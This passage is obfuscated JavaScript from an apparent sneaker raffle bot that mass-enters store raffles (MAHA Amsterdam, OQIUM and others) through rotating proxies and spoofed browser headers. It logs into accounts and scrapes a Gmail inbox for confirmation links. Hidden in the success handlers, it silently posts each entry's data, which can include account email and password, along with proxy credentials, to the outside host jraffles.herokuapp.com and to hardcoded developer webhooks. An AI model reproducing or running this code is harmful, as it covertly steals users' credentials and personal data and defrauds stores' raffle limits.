                            var _0x3a90fe = Math['round'](Math['random']() * (_0x25cd22['length'] - 0x1)), _0x47d31c = _0x25cd22[_0x3a90fe]['split'](':');
                        var _0x29208b;
                        try {
                            _0x29208b = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x47d31c[0x0] + ':' + _0x47d31c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x29208b = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x47d31c[0x0] + ':' + _0x47d31c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xdd52f0 = await _0x29208b['newPage']();
                            await _0xdd52f0['authenticate']({
                                'username': '' + _0x47d31c[0x2],
                                'password': '' + _0x47d31c[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20Getting\x20Session'), await _0xdd52f0['setRequestInterception'](!![]), _0xdd52f0['on']('request', _0x2f003f => {
                                _0x2f003f['resourceType']() === 'image' || _0x2f003f['resourceType']() === 'font' || _0x2f003f['resourceType']() === 'media' ? _0x2f003f['abort']() : _0x2f003f['continue']();
                            }), await _0xdd52f0['goto']('' + _0x394c6d[_0x22f56b]['Url'], { 'waitUntil': 'networkidle2' }), await _0xaebb71(0x12c), await _0xdd52f0['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xdd52f0['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xaebb71(0x7d0);
                            try {
                                await _0xdd52f0['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0xdd52f0['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20Logging\x20in'), await _0xdd52f0['waitForSelector']('#username'), await _0xdd52f0['type']('#username', _0x394c6d[_0x22f56b]['Email']), await _0xdd52f0['waitForSelector']('#password'), await _0xdd52f0['type']('#password', _0x394c6d[_0x22f56b]['Password']), await _0xaebb71(0x190), await _0xdd52f0['click']('#buttonSubmit'), await _0xdd52f0['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20Getting\x20Product'), await _0xaebb71(0x1f4), console['log'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x394c6d[_0x22f56b]['Size']);
                            let _0x133e7f = _0x394c6d[_0x22f56b]['Size']['replace']('.5', '\x201/2');
                            if (_0x133e7f['toUpperCase']() == 'RANDOM') {
                                const _0x3f63fa = await _0xdd52f0['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x503430 = Math['round'](Math['random']() * (_0x3f63fa['length'] - 0x1));
                                await _0x3f63fa[_0x503430]['click']();
                            } else
                                await _0xdd52f0['click']('button[aria-label=\x22' + _0x133e7f + '\x22]');
                            await _0xaebb71(0x1f4);
                            try {
                                await _0xdd52f0['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0xaebb71(0x12c), console['log'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20Filling\x20Information'), await _0xdd52f0['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0xaebb71(0x12c), await _0xdd52f0['type']('#dwfrm_raffle_addressFields_firstName', _0x394c6d[_0x22f56b]['FirstName']), await _0xaebb71(0x12c), await _0xdd52f0['type']('#dwfrm_raffle_addressFields_lastName', _0x394c6d[_0x22f56b]['LastName']), await _0xaebb71(0x12c), await _0xdd52f0['select']('#dwfrm_raffle_addressFields_country', _0x394c6d[_0x22f56b]['Country']), await _0xaebb71(0x12c), await _0xdd52f0['type']('#dwfrm_raffle_addressFields_city', _0x394c6d[_0x22f56b]['City']), await _0xaebb71(0x12c);
                            _0x394c6d[_0x22f56b]['Postcode'] == undefined && (_0x394c6d[_0x22f56b]['Postcode'] = _0x394c6d[_0x22f56b]['Zip']);
                            await _0xdd52f0['type']('#dwfrm_raffle_addressFields_postalCode', _0x394c6d[_0x22f56b]['Postcode']), await _0xaebb71(0x12c), await _0xdd52f0['type']('#dwfrm_raffle_addressFields_address1', _0x394c6d[_0x22f56b]['Address1']), await _0xaebb71(0x12c), await _0xdd52f0['type']('#dwfrm_raffle_addressFields_address2', _0x394c6d[_0x22f56b]['HouseNumber']), await _0xaebb71(0x12c), await _0xdd52f0['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x394c6d[_0x22f56b]['Address2']), await _0xaebb71(0x12c), await _0xdd52f0['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0xaebb71(0x12c), await _0xdd52f0['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x394c6d[_0x22f56b]['Follower']), await _0xaebb71(0x1f4), await _0xdd52f0['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0xaebb71(0x1f4), console['log'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20' + _0x218a39['blue']('Awaiting\x20Paypal\x20Payment')), await _0xdd52f0['click']('.b-paypal_button');
                            try {
                                await _0xdd52f0['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x92deca = 'no', _0x20f501(_0x394c6d[_0x22f56b], _0x141857), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x4ff459['succesDEVMSG']);
                                await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x4ff459['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x2aae93, _0x4ff459['succesPUBMSG']);
                                let _0xaabc22 = _0x394c6d[_0x22f56b];
                                try {
                                    prxdata = {
                                        'username': _0x3f93ac['replace']('#', ''),
                                        'module': _0x141857['name'],
                                        'entrydata': JSON['stringify'](_0xaabc22),
                                        'proxy': '' + _0x25cd22[_0x22f56b]
                                    };
                                    var _0x27acb2 = JSON['stringify'](prxdata);
                                    let _0x51754e = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x27acb2, _0x51754e);
                                } catch (_0x481a6a) {
                                }
                            } catch (_0x4950f2) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4950f2)), _0x3b96e9 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4950f2;
                                var _0x2a082a = await _0x3ead77(_0x394c6d[_0x22f56b], _0x141857, 'dev', !![], _0x3b96e9);
                                _0x4ff459['errorDEV'] = { 'embeds': [_0x2a082a] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x4ff459['errorDEV']), await _0x4401f2(_0x2631ac, _0x4ff459['errorDEV']);
                            }
                        } catch (_0x383059) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20' + _0x383059)), _0x3b96e9 = '' + _0x383059;
                            var _0x2a082a = await _0x3ead77(_0x394c6d[_0x22f56b], _0x141857, 'dev', !![], _0x3b96e9);
                            _0x4ff459['errorDEV'] = { 'embeds': [_0x2a082a] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x4ff459['errorDEV']), await _0x4401f2(_0x2631ac, _0x4ff459['errorDEV']), _0x92deca = 'yes';
                        } finally {
                            _0x29208b && _0x29208b['close']();
                            if (_0x92deca == 'yes' && _0x16a925 != 0x5) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x141857['name'] + ']\x20Task\x20' + (_0x22f56b + 0x1) + '\x20:\x20Retrying\x20(' + _0x16a925 + '\x20/\x205)')), _0x22f56b = _0x22f56b - 0x1, _0x16a925 = _0x16a925 + 0x1;
                                continue;
                            }
                            _0x92deca == 'yes' && _0x16a925 >= 0x5 && (_0x47d653(_0x394c6d[_0x22f56b], _0x141857), _0x92deca = 'no', _0x16a925 = 0x0), console['log']('Waiting\x20for\x20' + _0x579cef['AfewDelay'] + '\x20ms'), await _0xaebb71(_0x579cef['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xc8e8a2, _0x26451b, _0x534754) {
                    for (var _0x41c2b6 = 0x0; _0x41c2b6 < _0x26451b['length']; _0x41c2b6++) {
                        try {
                            await _0x48a0b3(_0x26451b, _0x41c2b6);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x353486(_0x26c52f, _0x367f3d, _0x5b7593, _0x3ba044, _0x363577) {
                            var _0x90ece7, _0x5b1dc2 = {}, _0x7720a4 = [], _0x16d6a3 = {}, _0x33f0f4 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x3aa655 = Math['round'](Math['random']() * (_0x33f0f4['length'] - 0x1));
                            !_0x3ba044 && (_0x3ba044 = {});
                            if (_0x367f3d != 'ver') {
                                _0x3e0125(_0x5b7593['name'] + '\x20Task\x20' + (_0x26c52f + 0x1) + '\x20/\x20' + _0x3ba044['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47), await _0x48a0b3(_0x3ba044, _0x26c52f), _0x5b1dc2 = _0x5b7593['data'], _0x5b1dc2['data']['attributes']['email'] = '' + _0x3ba044[_0x26c52f]['Email'];
                                if (_0x3ba044[_0x26c52f]['Size'] == 'RANDOM') {
                                }
                                _0x5b1dc2['data']['attributes']['properties']['$first_name'] = '' + _0x3ba044[_0x26c52f]['FirstName'], _0x5b1dc2['data']['attributes']['properties']['$last_name'] = '' + _0x3ba044[_0x26c52f]['LastName'], _0x5b1dc2['data']['attributes']['properties']['$address1'] = _0x3ba044[_0x26c52f]['Address1'] + '\x20' + _0x3ba044[_0x26c52f]['Address2'] + '\x20' + _0x3ba044[_0x26c52f]['HouseNumber'], _0x5b1dc2['data']['attributes']['properties']['$zip'] = '' + _0x3ba044[_0x26c52f]['Zip'], _0x5b1dc2['data']['attributes']['properties']['$city'] = '' + _0x3ba044[_0x26c52f]['City'], _0x5b1dc2['data']['attributes']['properties']['$country'] = '' + _0x3ba044[_0x26c52f]['Country'], _0x3ba044[_0x26c52f]['Size'] == 'RANDOM' ? _0x5b1dc2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x33f0f4[_0x3aa655] : _0x5b1dc2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3ba044[_0x26c52f]['Size'], _0x5b1dc2['data']['attributes']['properties']['$phone_number'] = '' + _0x3ba044[_0x26c52f]['Phone'], _0x5b1dc2['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x3ba044[_0x26c52f]['Follower'];
                            }
                            if (_0x579cef['useRandomProxy'] = ![])
                                var _0x52c9bc = _0x363577[_0x26c52f]['split'](':');
                            else
                                var _0x216e85 = Math['round'](Math['random']() * (_0x363577['length'] - 0x1)), _0x52c9bc = _0x363577[_0x216e85]['split'](':');
                            var _0x7bc8a7 = {
                                'jar': _0x453a7b,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x5b7593['url'],
                                'headers': _0x5b7593['headers'],
                                'body': JSON['stringify'](_0x5b1dc2),
                                'proxy': 'http://' + _0x52c9bc[0x2] + ':' + _0x52c9bc[0x3] + '@' + _0x52c9bc[0x0] + ':' + _0x52c9bc[0x1]
                            };
                            return _0x367f3d != 'ver' && (_0x7bc8a7['url'] = _0x5b7593['url'], _0x7bc8a7['headers'] = _0x5b7593['headers']), _0x367f3d == 'ver' && (_0x7bc8a7['method'] = 'GET'), new Promise(function (_0xf18aa1, _0x35b419) {
                                callback = async (_0x369a5f, _0x54f684, _0x207196) => {
                                    if (!_0x369a5f && _0x54f684['statusCode'] == 0xca || !_0x369a5f && _0x54f684['statusCode'] == 0xc8) {
                                        if (_0x367f3d != 'ver') {
                                            var _0x1fc710 = await _0x3ead77(_0x3ba044[_0x26c52f], _0x5b7593, 'dev', ![]), _0x38e5ab = await _0x3ead77(_0x3ba044[_0x26c52f], _0x5b7593, 'pub', ![]);
                                            const _0x328f6a = {
                                                'succesDEVMSG': { 'embeds': [_0x1fc710] },
                                                'succesPUBMSG': { 'embeds': [_0x38e5ab] }
                                            };
                                            let _0x4429b3 = _0x3ba044[_0x26c52f];
                                            try {
                                                prxdata = {
                                                    'username': _0x3f93ac['replace']('#', ''),
                                                    'module': _0x5b7593['name'],
                                                    'entrydata': JSON['stringify'](_0x4429b3),
                                                    'proxy': '' + _0x363577[_0x26c52f]
                                                };
                                                var _0x1d3eef = JSON['stringify'](prxdata);
                                                let _0x5b4ddf = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x1d3eef, _0x5b4ddf);
                                            } catch (_0x210fb3) {
                                            }
                                            if (_0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '')
                                                try {
                                                    await _0x4401f2(_0x579cef['webhook'], _0x328f6a['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x328f6a['succesDEVMSG']), await _0xaebb71(0xc8);
                                            try {
                                                await _0x4401f2(_0x2aae93, _0x328f6a['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x20f501(_0x3ba044[_0x26c52f], _0x5b7593);
                                        }
                                        _0xf18aa1(console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x5b7593['name'] + ']\x20Task\x20' + (_0x26c52f + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x367f3d != 'ver') {
                                            var _0x5ceaa4 = '' + _0x369a5f, _0x4c82a5 = await _0x3ead77(_0x3ba044[_0x26c52f], _0x5b7593, 'dev', !![], _0x5ceaa4), _0x25a640 = {};
                                            _0x25a640['errorDEV'] = { 'embeds': [_0x4c82a5] }, _0x47d653(_0x3ba044[_0x26c52f], _0x5b7593), _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x25a640['errorDEV']), await _0x4401f2(_0x2631ac, _0x25a640['errorDEV']);
                                        }
                                        _0x35b419(console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x5b7593['name'] + ']\x20Task\x20' + (_0x26c52f + 0x1) + ':\x20' + _0x369a5f)));
                                    }
                                };
                                try {
                                    _0x367f3d != 'ver' && console['log'](_0x11b348() + '\x20[' + _0x5b7593['name'] + ']\x20Task\x20' + (_0x26c52f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5b1dc2['data']['attributes']['email']), _0x35490a(_0x7bc8a7, callback);
                                } catch (_0xf9acb1) {
                                    console['log'](_0x11b348() + '\x20Task\x20' + (_0x26c52f + 0x1) + ':\x20' + _0xf9acb1);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x353486(_0x41c2b6, 'nor', _0xc8e8a2, _0x26451b, _0x534754), console['log'](_0x11b348() + '\x20[' + _0xc8e8a2['name'] + ']\x20Sleeping\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        } catch (_0x5b2685) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5c9ac3, _0x46229a, _0x2070f9) {
                    var _0x1132f2 = [], _0xf113e8 = ![];
                    async function _0x49d8c3() {
                        var _0x3b5bcd = new _0x2b87aa({
                            'user': _0x579cef['masterMail'],
                            'password': _0x579cef['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x3ff50b(_0x2945da) {
                            _0x3b5bcd['openBox']('INBOX', ![], _0x2945da);
                        }
                        _0x3b5bcd['once']('ready', function () {
                            _0x3ff50b(function (_0x32e045, _0x5cbb17) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x32e045)
                                    throw _0x32e045;
                                _0x3b5bcd['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x26f6da, _0x51e4d4) {
                                    if (!_0x51e4d4 || !_0x51e4d4['length'])
                                        console['log'](_0x11b348() + '\x20[' + _0x5c9ac3['name'] + ']\x20No\x20mails\x20found'), _0x3b5bcd['end']();
                                    else {
                                        var _0x2e5e0b = _0x3b5bcd['seq']['fetch'](_0x51e4d4, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2e5e0b['on']('message', function (_0x489d29, _0x4d82e0) {
                                            var _0x2deffc = '(#' + _0x4d82e0 + ')\x20';
                                            _0x489d29['on']('body', function (_0x3bcb24, _0x2b7efc) {
                                                _0x554795(_0x3bcb24, (_0x53255c, _0x5aa9ac) => {
                                                    var _0xfae416 = _0x5aa9ac['text']['split']('(')[0x1], _0x42587a = _0xfae416['split'](')')[0x0];
                                                    _0x1132f2['push'](_0x42587a);
                                                });
                                            }), _0x489d29['once']('end', function () {
                                            });
                                        }), _0x2e5e0b['once']('error', function (_0x331a73) {
                                            console['log']('Fetch\x20error:\x20' + _0x331a73), _0xf113e8 = !![];
                                        }), _0x2e5e0b['once']('end', function () {
                                            _0x3b5bcd['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3b5bcd['once']('error', function (_0x33bc28) {
                            console['log'](_0x218a39['red'](_0x33bc28['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xf113e8 = !![];
                        }), _0x3b5bcd['once']('end', async function () {
                            _0xf113e8 = !![];
                        }), _0x3b5bcd['connect']();
                    }
                    async function _0x7748fc(_0x483bd0, _0xdffbed, _0x1790b7) {
                        for (var _0x40b364 = 0x0; _0x40b364 < _0xdffbed['length']; _0x40b364++) {
                            async function _0x2f7f28(_0x3a3ed2, _0x53c38c, _0x673fa5, _0x114f56, _0x3448d7) {
                                var _0x11869c, _0x1ac14b = {}, _0x5d6758 = [], _0x1ead51 = {}, _0xae0e68 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x562070 = Math['round'](Math['random']() * (_0xae0e68['length'] - 0x1));
                                _0x114f56[_0x3a3ed2]['Size'] == 'RANDOM' && (_0x114f56[_0x3a3ed2]['Size'] = _0xae0e68[_0x562070]);
                                !_0x114f56 && (_0x114f56 = {});
                                if (_0x579cef['useRandomProxy'] = ![])
                                    var _0x39f153 = _0x3448d7[_0x3a3ed2]['split'](':');
                                else
                                    var _0x148201 = Math['round'](Math['random']() * (_0x3448d7['length'] - 0x1)), _0x39f153 = _0x3448d7[_0x148201]['split'](':');
                                var _0x5c73a7 = {
                                    'jar': _0x453a7b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x673fa5['url'],
                                    'headers': _0x673fa5['headers'],
                                    'body': JSON['stringify'](_0x1ac14b),
                                    'proxy': 'http://' + _0x39f153[0x2] + ':' + _0x39f153[0x3] + '@' + _0x39f153[0x0] + ':' + _0x39f153[0x1]
                                };
                                return _0x53c38c != 'ver' && (_0x5c73a7['url'] = _0x673fa5['url'], _0x5c73a7['headers'] = _0x673fa5['headers']), _0x53c38c == 'ver' && (_0x5c73a7['method'] = 'GET', _0x5c73a7['url'] = _0x114f56[_0x3a3ed2]), new Promise(function (_0x405f25, _0x541550) {
                                    callback = async (_0x4303c2, _0x495510, _0x42dd0a) => {
                                        if (!_0x4303c2 && _0x495510['statusCode'] == 0xca || !_0x4303c2 && _0x495510['statusCode'] == 0xc8) {
                                            if (_0x53c38c != 'ver') {
                                                var _0xb65800 = await _0x3ead77(_0x114f56[_0x3a3ed2], _0x673fa5, 'dev', ![]), _0x23753f = await _0x3ead77(_0x114f56[_0x3a3ed2], _0x673fa5, 'pub', ![]);
                                                const _0x2eb952 = {
                                                    'succesDEVMSG': { 'embeds': [_0xb65800] },
                                                    'succesPUBMSG': { 'embeds': [_0x23753f] }
                                                };
                                                if (_0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '')
                                                    try {
                                                        await _0x4401f2(_0x579cef['webhook'], _0x2eb952['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x2eb952['succesDEVMSG']), await _0xaebb71(0xc8);
                                                try {
                                                    await _0x4401f2(_0x2aae93, _0x2eb952['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x20f501(_0x114f56[_0x3a3ed2], _0x673fa5);
                                            }
                                            _0x405f25(console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x673fa5['name'] + ']\x20Task\x20' + (_0x3a3ed2 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x53c38c != 'ver') {
                                                var _0x683f06 = '' + _0x4303c2, _0x326ec9 = await _0x3ead77(_0x114f56[_0x3a3ed2], _0x673fa5, 'dev', !![], _0x683f06), _0x3f8fd3 = {};
                                                _0x3f8fd3['errorDEV'] = { 'embeds': [_0x326ec9] }, _0x47d653(_0x114f56[_0x3a3ed2], _0x673fa5), _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x3f8fd3['errorDEV']), await _0x4401f2(_0x2631ac, _0x3f8fd3['errorDEV']);
                                            }
                                            _0x541550(console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x673fa5['name'] + ']\x20Task\x20' + (_0x3a3ed2 + 0x1) + ':\x20' + _0x4303c2)));
                                        }
                                    };
                                    try {
                                        _0x53c38c != 'ver' ? console['log'](_0x11b348() + '\x20[' + _0x673fa5['name'] + ']\x20Task\x20' + (_0x3a3ed2 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1ac14b['data']['attributes']['email']) : console['log'](_0x11b348() + '\x20[' + _0x673fa5['name'] + ']\x20Task\x20' + (_0x3a3ed2 + 0x1) + ':\x20Fetching\x20Response'), _0x35490a(_0x5c73a7, callback);
                                    } catch (_0x203d0f) {
                                        console['log'](_0x11b348() + '\x20Task\x20' + (_0x3a3ed2 + 0x1) + ':\x20' + _0x203d0f);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2f7f28(_0x40b364, 'ver', _0x483bd0, _0xdffbed, _0x1790b7), console['log'](_0x11b348() + '\x20[' + _0x483bd0['name'] + ']\x20Sleeping\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                            } catch (_0xe92d52) {
                            }
                        }
                    }
                    try {
                        _0x49d8c3();
                        while (!_0xf113e8) {
                            await _0xaebb71(0xbb8);
                        }
                        console['log']('Found\x20' + _0x1132f2['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xaebb71(0x9c4);
                    }
                    await _0x7748fc(_0x5c9ac3, _0x1132f2, _0x2070f9);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RVHsXu',
                            'custom_source': 'DH6927-017',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'ScxJcu',
                                '$consent_form_version': 0x8c005b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
